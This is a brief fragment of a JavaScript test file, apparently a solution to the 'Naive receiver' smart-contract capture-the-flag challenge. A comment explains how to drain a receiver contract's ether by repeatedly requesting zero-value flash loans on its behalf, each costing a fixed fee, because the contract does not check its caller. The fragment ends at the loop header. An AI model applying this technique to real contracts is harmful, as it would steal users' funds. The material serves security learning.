...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
         ...
         * In order to hack the receiver contract and drain it from it ether, 
         * so the function "receiveEther" doesn't check who can call the function(onlyOwner),
         * then we can use the user contract address to get flash loan of 0, 10 times 
         * to pay FIXED_FEE of 1ETH until the contract get drained from ETH
         * */
        for(let i = 0; i < 10; i++) {
